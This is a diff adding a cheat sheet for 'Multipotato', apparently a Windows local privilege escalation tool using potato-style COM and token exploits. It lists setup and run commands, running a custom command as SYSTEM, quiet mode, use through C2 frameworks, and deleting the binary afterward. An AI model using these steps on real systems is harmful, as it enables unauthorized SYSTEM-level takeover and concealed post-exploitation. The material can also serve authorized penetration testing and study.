@@ -1,0 +1,42 @@
+# ================= Multipotato =================
+# Description:
+# Multipotato is a local privilege escalation tool that tries various COM/Token-based exploits to escalate privileges to SYSTEM on Windows.
+
+# ---------------- SETUP ----------------
+# Clone the repository:
+git clone https://github.com/byt3bl33d3r/Multipotato.git
+cd Multipotato
+
+# Compile using Visual Studio (C++) or download from trusted sources
+
+# ---------------- USAGE ----------------
+# Basic run (attempt all available methods):
+Multipotato.exe
+
+# Show help menu and available options
+Multipotato.exe -h
+
+# Run a specific method (e.g., PrintSpoofer only):
+Multipotato.exe -m printspoofer
+
+# Execute a custom command with SYSTEM privileges
+Multipotato.exe -m printspoofer -c "cmd.exe /c whoami"
+
+# Run silently (no output)
+Multipotato.exe -q
+
+# ---------------- OUTPUT ----------------
+# If successful, you’ll get a SYSTEM shell or see "NT AUTHORITY\SYSTEM" in output
+
+# ---------------- NOTES ----------------
+# - Requires a vulnerable environment (works best on older/unpatched Windows builds).
+# - Works only for local privilege escalation — not for remote code execution.
+# - Can be used in post-exploitation stages through C2 frameworks like Cobalt Strike or Mythic.
+
+# ---------------- CLEANUP ----------------
+# Remove the binary after use:
+del Multipotato.exe
+
+# ---------------- TIPS ----------------
+# Test individual methods on different systems — some may fail depending on patch level.
+# Ensure you have Administrator privileges (not just user) for some methods.
